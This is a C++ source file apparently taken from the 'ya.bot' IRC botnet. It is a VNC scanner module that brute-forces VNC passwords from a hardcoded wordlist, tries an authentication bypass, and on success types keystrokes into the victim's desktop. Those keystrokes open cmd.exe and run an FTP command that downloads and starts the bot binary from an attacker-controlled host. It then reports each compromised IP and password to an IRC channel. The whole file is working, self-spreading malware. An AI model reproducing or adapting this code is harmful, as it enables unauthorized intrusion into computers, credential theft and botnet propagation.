/*  ya.bot  */

#include "..\..\..\bot\bot.h"

#ifndef NO_EXPSCAN
#ifndef NO_EXPSCANVNC

#include "rfb.h"
extern "C" {
	#include "d3des.h"
}

//max size 8 characters
char *passwordlist[] = {
"123",
"1234",
"12345",
"123456",
"1234567",
"12345678",
"87654321",
"7654321",
"654321",
"4321",
"321",
"21",
"abc",
"abcd",
"abcde",
"abcdef",
"abcdefgh",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"a",
"b",
"c",
"d",
"e",
"qwerty",
"monkey",
"help",
"pimp",
"sexy",
"sex",
"testing",
"test",
"changeme",
"change",
"computer",
"comp",
"cam",
"vnc",
"root",
"admin",
"password",
"leet",
"1337",
"bitch",
"fuck",
"shit",
"whore",
"crack",
"cracker",
"weed",
"coke",
"god",
"jesus",
"pimp",
"pimpin",
"ryan",
"bob",
"bobnob",
"tom",
"helpme",
"~!@#$%^&",
"!@#$%^&*",
"bass",
"kkk",
"kool",
"cool",
"money",
"paper",
"register",
"owner",
"master",
"duck",
"dell",
"ftp",
"server",
"admin",
"high",
"pass",
"porn",
"boobs",
"love"
};

#define MAXPWLEN 8
#define CHALLENGESIZE 16
#define sizeofpasslist (sizeof(passwordlist) / sizeof(LPTSTR))

int ext_num;
int usedlist[sizeofpasslist];

unsigned char fixedkey[8] = {23,82,107,6,35,78,88,7};

void vncEncryptBytes(unsigned char *bytes, char *passwd)
{
    unsigned char key[8];
    unsigned int i;

    /* key is simply password padded with nulls */

    for (i = 0; i < 8; i++) {
		if (i < strlen(passwd)) {
		    key[i] = passwd[i];
		} else {
		    key[i] = 0;
		}
    }

    deskey(key, EN0);

    for (i = 0; i < CHALLENGESIZE; i += 8) {
		des(bytes+i, bytes+i);
    }
}

void vncEncryptPasswd(unsigned char *encryptedPasswd, char *passwd )
{
	unsigned int i;

    /* pad password with nulls */
    for (i = 0; i < MAXPWLEN; i++) {
		if (i < strlen(passwd)) {
			encryptedPasswd[i] = passwd[i];
		} else {	
			encryptedPasswd[i] = 0;
		}
    }

    /* Do encryption in-place - this way we overwrite our copy of the plaintext
       password */
    deskey(fixedkey, EN0);
    des(encryptedPasswd, encryptedPasswd);
}

BOOL ReadExact(SOCKET r_sock, char *inbuf, int wanted) {

	int offset = 0;
	
	while (wanted > 0) {
		int bytes = recv(r_sock, inbuf+offset, wanted, 0);
		if ((bytes == 0) || (bytes == SOCKET_ERROR)) return FALSE;
		wanted -= bytes;
		offset += bytes;
	}

	return TRUE;
}

BOOL WriteExact(SOCKET w_sock, char *buf, int bytes) {

	if (bytes == 0) return FALSE;

	int i = 0;
    int j;

    while (i < bytes) {
		j = send(w_sock, buf+i, bytes-i, 0);
		if (j == SOCKET_ERROR || j==0) return FALSE;
		i += j;
    }

	return TRUE;
}

inline void ReadString(SOCKET s_sock, char *buf, int length)
{
	if (length > 0)
		ReadExact(s_sock, buf, length);
	buf[length] = '\0';
}


/*
	Universal VNC Rooter by D
*/

// state: 1 - enable key (press)
//		  0 - disable key (release)
// if state == 2: first enable key, then disable
void SendKey(SOCKET sock, char bkey, char key, int state)
{
	char sendkey[8];

	// compose packet
	memset(sendkey, '\x04', 1);

	if (state == 0 || state == 1)
		memset(sendkey + 1, state, 1);
	else
		memset(sendkey + 1, 1, 1);

	memset(sendkey + 2, 0, 4);
	memset(sendkey + 6, bkey, 1);
	memset(sendkey + 7, key, 1);

	send(sock, sendkey, sizeof(sendkey), 0);

	if (state > 1)
	{
		memset(sendkey + 1, 0, 1);
		send(sock, sendkey, sizeof(sendkey), 0);
	}
}

void VNCRoot(SOCKET sVNC, char *ftp)
{
	char text_cmd[] = "%systemroot%\\system32\\cmd.exe";
	char bkey = '\xff',
		 keyctrl = '\xe3',
		 keyalt = '\xe9',
		 keydel = '\x9f',
		 keydown = '\x54',
		 keyenter = '\x0d';
	unsigned int i;

	Sleep(2000);

	//Press ENTER (in case of screensaver)
	SendKey(sVNC, bkey, keyenter, 2);
	Sleep(500);

	//Press ctrl+alt+del
	SendKey(sVNC, bkey, keyctrl, 1);
	SendKey(sVNC, bkey, keyalt, 1);
	SendKey(sVNC, bkey, keydel, 1);
	Sleep(100);
	SendKey(sVNC, bkey, keydel, 0);
	SendKey(sVNC, bkey, keyalt, 0);
	SendKey(sVNC, bkey, keyctrl, 0);

	Sleep(2000);

	//If its Windows2k
	for (i = 0; i < 4; i++) 
	{
		SendKey(sVNC, bkey, keydown, 2);
		Sleep(500);
	}

	//Press ENTER
	SendKey(sVNC, bkey, keyenter, 2);
	Sleep(2000);

	//Now the taskmanager is opened on winxp and win2k

	//Press and release alt key
	SendKey(sVNC, bkey, keyalt, 2);
	Sleep(500);
	
	//Press down arrow key
	SendKey(sVNC, bkey, keydown, 2);
	Sleep(500);

	//Press ENTER
	SendKey(sVNC, bkey, keyenter, 2);
	Sleep(2000);

	//Run window is opened

	//type in "cmd"
	for (i = 0; i < strlen(text_cmd); i++) 
	{
		SendKey(sVNC, 0, text_cmd[i], 2);
		Sleep(125);
	}

	//press ENTER
	SendKey(sVNC, bkey, keyenter, 2);
	Sleep(2000);

	//send ftp line
	for (i = 0; i < strlen(ftp); i++) 
	{
		SendKey(sVNC, 0, ftp[i], 2);
		Sleep(125);
	}
   
	//press ENTER
	SendKey(sVNC, bkey, keyenter, 2);
	Sleep(2000);
	
	SendKey(sVNC, bkey, keyenter, 2);
}


bool vncps(SExpScanInfo s_esi) {

	char SendBuf[IRCBUF];

	int CFretry = 0;
	BOOL ABcheck = TRUE;
	char FTPLine[256];
	int checked = 0;
	int r;

closesocket(s_esi.m_csock);
	srand(GetTickCount());
	r = rand()%sizeofpasslist;

/*	if (UseCFTP) 
		_snprintf(FTPLine, sizeof(FTPLine), 
			"cmd /c echo open %s %d >> ik &echo user %s %s >> ik &echo binary >> ik &echo get %s >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &%s &exit",	
			CFTPHost, CFTPPort, CFTPUser, CFTPPass, CFTPFile, CFTPFile);
	else {
		char Fname[MAX_PATH];
		_snprintf(Fname, sizeof(Fname), "%s.exe", GenerateNumberNick(1));
		_snprintf(FTPLine, sizeof(FTPLine), 
			"cmd /c echo open %s %d >> ik &echo user %s %s >> ik &echo get %s >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &%s &exit",
			GetIP(Sock), FTPPort, FTPUser, FTPPass, Fname, Fname);
	}*/
					_snprintf(FTPLine, sizeof(FTPLine), "SELECT do_system('"
							"echo open %s %i > temp987.dat&"
							"echo user %s %s >> temp987.dat&"
							"echo get %s C:\\%s >> temp987.dat&"
							"echo quit >> temp987.dat&"
							"ftp -n -s:temp987.dat&"
							"start C:\\%s&"
							"del /Q temp987.dat&"
							"%s"
							"')",
							ip_getip(s_esi.m_bsock),
							daemonftpport, daemonftpuser, daemonftppass,
							botfilename, botfilename, botfilename, botfilename);	

	while (1) {

		struct sockaddr_in thataddr;
		int res;
		SOCKET m_sock;

		m_sock = socket(PF_INET, SOCK_STREAM, 0);
		if (m_sock == INVALID_SOCKET) {
			closesocket(m_sock);
			return FALSE;
		}
		
		thataddr.sin_addr.s_addr = inet_addr(s_esi.m_szIP);
		thataddr.sin_family = AF_INET;
		thataddr.sin_port = htons(5900);	

		res = connect(m_sock, (LPSOCKADDR) &thataddr, sizeof(thataddr));
		if (res == SOCKET_ERROR) {
			closesocket(m_sock);		
			return FALSE;
		}

		//connected
		//now lets negotiate protocol
		rfbProtocolVersionMsg pv;

		if (!ReadExact(m_sock, pv, sz_rfbProtocolVersionMsg)) {
			closesocket(m_sock);
			return FALSE;
		}

		pv[sz_rfbProtocolVersionMsg] = 0;

		int m_majorVersion, m_minorVersion;

		if (sscanf(pv,rfbProtocolVersionFormat,&m_majorVersion,&m_minorVersion) != 2) {
			closesocket(m_sock);
			return FALSE;
		}

		if ((m_majorVersion == 3) && (m_minorVersion < 3)) {
			// if server is 3.2 we can't use the new authentication //
			closesocket(m_sock);
			return FALSE;
		}

		if ((m_majorVersion == 3) && (m_minorVersion == 8) && ABcheck) {
			sprintf(pv, rfbProtocolVersionFormat, rfbProtocolMajorVersion, rfbProtocolMinorVersionFake);
		} else {
			sprintf(pv, rfbProtocolVersionFormat, rfbProtocolMajorVersion, rfbProtocolMinorVersion);
			ABcheck = FALSE;
		}

		if (!WriteExact(m_sock, pv, sz_rfbProtocolVersionMsg)) {
			closesocket(m_sock);
			return FALSE;
		}

		//auth part
		CARD32 authScheme, authResult;
		CARD8 challenge[CHALLENGESIZE];

		if (ABcheck) {
			ABcheck = FALSE;
			char szClientPacket[] = "\x01";
			//we expect to get 2 bytes 
			if (!ReadExact(m_sock, (char *)&authScheme, 2)) {
				closesocket(m_sock);
				return FALSE;
			}
			//return clientpacket
			if (!WriteExact(m_sock, szClientPacket, 1)) {
				closesocket(m_sock);
				return FALSE;
			}
			if (ReadExact(m_sock, (char *) &authResult, 4)) {
			
				authResult = Swap32IfLE(authResult);
			
				switch (authResult) {
				case rfbVncAuthOK: 
					{		
						rfbServerInitMsg m_si;
						//send non-shared session request and receive data
						if (WriteExact(m_sock, (char *) useShared, sz_rfbClientInitMsg) && 
							ReadExact(m_sock, (char *) &m_si, sz_rfbServerInitMsg)) {							
							//lets get desktop name
							m_si.framebufferWidth = Swap16IfLE(m_si.framebufferWidth);
							m_si.framebufferHeight = Swap16IfLE(m_si.framebufferHeight);
							m_si.format.redMax = Swap16IfLE(m_si.format.redMax);
							m_si.format.greenMax = Swap16IfLE(m_si.format.greenMax);
							m_si.format.blueMax = Swap16IfLE(m_si.format.blueMax);
							m_si.nameLength = Swap32IfLE(m_si.nameLength);

							TCHAR *m_desktopName;
							m_desktopName = new TCHAR[m_si.nameLength + 2];

							ReadString(m_sock, m_desktopName, m_si.nameLength);

							_snprintf(SendBuf, sizeof(SendBuf), "VNC%d.%d %s: %s - [AuthBypass]", 
								m_majorVersion, m_minorVersion, m_desktopName, s_esi.m_szIP);
	if (!s_esi.m_bSilent)
			irc_message(s_esi.m_bsock, (char *)string_ircprivmsg, s_esi.m_szResultChannel, SendBuf);
//							IrcPrivmsg(Sock, VNCChan, SendBuf);
							memset(SendBuf, 0, sizeof(SendBuf));

//							if (Root)
								VNCRoot(m_sock, FTPLine);
						}

						closesocket(m_sock);
						return TRUE;
					}
				default:
					{
						closesocket(m_sock);
						break;
					}	
				}
			} else {				
				closesocket(m_sock);
			}
			Sleep(5000);

		} else {
			if (!ReadExact(m_sock, (char *)&authScheme, 4)) {
				closesocket(m_sock);
				return FALSE;
			}

			authScheme = Swap32IfLE(authScheme);
	
			switch (authScheme) {
		
			case rfbConnFailed:
				{
					//lets try again
					closesocket(m_sock);
					CFretry++;
					if (CFretry == 2) { //not worth trying anymore
						return FALSE;
					}
					Sleep(2000);
					break;
				}
		
			case rfbNoAuth:
				{
					rfbServerInitMsg m_si;
					//send non-shared session request and receive data
					if (WriteExact(m_sock, (char *) useShared, sz_rfbClientInitMsg) && 
						ReadExact(m_sock, (char *) &m_si, sz_rfbServerInitMsg)) {							
						//lets get desktop name
						m_si.framebufferWidth = Swap16IfLE(m_si.framebufferWidth);
						m_si.framebufferHeight = Swap16IfLE(m_si.framebufferHeight);
						m_si.format.redMax = Swap16IfLE(m_si.format.redMax);
						m_si.format.greenMax = Swap16IfLE(m_si.format.greenMax);
						m_si.format.blueMax = Swap16IfLE(m_si.format.blueMax);
						m_si.nameLength = Swap32IfLE(m_si.nameLength);

						TCHAR *m_desktopName;
						m_desktopName = new TCHAR[m_si.nameLength + 2];

						ReadString(m_sock, m_desktopName, m_si.nameLength);

						_snprintf(SendBuf, sizeof(SendBuf), "VNC%d.%d %s: %s - [NoPassword]", 
							m_majorVersion, m_minorVersion, m_desktopName, s_esi.m_szIP);
	if (!s_esi.m_bSilent)
			irc_message(s_esi.m_bsock, (char *)string_ircprivmsg, s_esi.m_szResultChannel, SendBuf);
//						IrcPrivmsg(Sock, VNCChan, SendBuf);
						memset(SendBuf, 0, sizeof(SendBuf));

//						if (Root)
							VNCRoot(m_sock, FTPLine);
					}

					closesocket(m_sock);
					return TRUE;
				}
		
			case rfbVncAuth:
				{
					if (!ReadExact(m_sock, (char *)challenge, CHALLENGESIZE)) {
						closesocket(m_sock);
						return FALSE;
					}

					char passwd[256];	
					unsigned char m_encPasswd[8];

					r++;
					if (r == sizeofpasslist)
						r = 0;
					strncpy(passwd, passwordlist[r], sizeof(passwd)-1);

					passwd[strlen(passwd)] = '\0';

					vncEncryptPasswd(m_encPasswd, passwd);				
	
					vncEncryptBytes(challenge, passwd);
			
					if (!WriteExact(m_sock, (char *) challenge, CHALLENGESIZE)) {
						closesocket(m_sock);
						return FALSE;
					}

					if (!ReadExact(m_sock, (char *) &authResult, 4)) {
						closesocket(m_sock);
						return FALSE;
					}
			
					authResult = Swap32IfLE(authResult);
			
					switch (authResult) {
					case rfbVncAuthOK: 
						{		
							rfbServerInitMsg m_si;
							//send non-shared session request and receive data
							if (WriteExact(m_sock, (char *) useShared, sz_rfbClientInitMsg) && 
								ReadExact(m_sock, (char *) &m_si, sz_rfbServerInitMsg)) {							
								//lets get desktop name
								m_si.framebufferWidth = Swap16IfLE(m_si.framebufferWidth);
								m_si.framebufferHeight = Swap16IfLE(m_si.framebufferHeight);
								m_si.format.redMax = Swap16IfLE(m_si.format.redMax);
								m_si.format.greenMax = Swap16IfLE(m_si.format.greenMax);
								m_si.format.blueMax = Swap16IfLE(m_si.format.blueMax);
								m_si.nameLength = Swap32IfLE(m_si.nameLength);

								TCHAR *m_desktopName;
								m_desktopName = new TCHAR[m_si.nameLength + 2];

								ReadString(m_sock, m_desktopName, m_si.nameLength);

								_snprintf(SendBuf, sizeof(SendBuf), "VNC%d.%d %s: %s - %s", 
									m_majorVersion, m_minorVersion, m_desktopName, s_esi.m_szIP, passwd);
	if (!s_esi.m_bSilent)
			irc_message(s_esi.m_bsock, (char *)string_ircprivmsg, s_esi.m_szResultChannel, SendBuf);
//								IrcPrivmsg(Sock, VNCChan, SendBuf);
								memset(SendBuf, 0, sizeof(SendBuf));

//								if (Root)
									VNCRoot(m_sock, FTPLine);

							}

							closesocket(m_sock);
							return TRUE;
						}
					case rfbVncAuthFailed: 
						{
							CFretry = 0;
							closesocket(m_sock);
							checked++;
							if (checked == sizeofpasslist)
								return FALSE;
							Sleep(5000); //lets wait and try another pass
							break;
						}
					default:
						{
							closesocket(m_sock);
							return FALSE;
						}
					}
					break;
				}
		
			default:
				{
				closesocket(m_sock);
				return FALSE;
				}
			}
		}
		if (m_sock != INVALID_SOCKET) {
			shutdown(m_sock, SD_BOTH);
			closesocket(m_sock);
			m_sock = INVALID_SOCKET;
		}
		Sleep(100);
	}
	return FALSE;
}
#endif
#endif